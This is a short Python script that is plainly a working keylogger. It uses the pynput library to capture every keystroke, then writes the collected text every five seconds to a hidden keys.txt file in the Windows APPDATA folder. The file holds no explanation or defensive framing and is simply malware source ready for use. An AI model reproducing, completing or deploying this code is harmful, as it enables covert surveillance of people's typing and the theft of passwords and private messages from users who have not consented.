#!/usr/bin/python
import pynput.keyboard
import threading
import os

keys = ""
path = os.environ["appdata"] + "\\keys.txt"
def process_key(key):
	global keys
	try:
		keys = keys + str(key.char)
	except AttributeError:
		if key == key.space:
			keys = keys + " "
		elif key == key.enter:
			keys = keys + ""
		elif key == key.right:
			keys = keys + ""
		elif key == key.left:
			keys = keys + ""
		elif key == key.up:
			keys = keys + ""
		elif key == key.down:
			keys = keys + ""
		else:
			keys = keys + " " + str(key) + " "

def report():
	global keys
	fin = open(path, "a")
	fin.write(keys)
	keys = ""
	fin.close()
	timer = threading.Timer(5, report)
	timer.start()

def start_keylogger():
	listener = pynput.keyboard.Listener(on_press=process_key)
	with listener:
		report()
		listener.join()
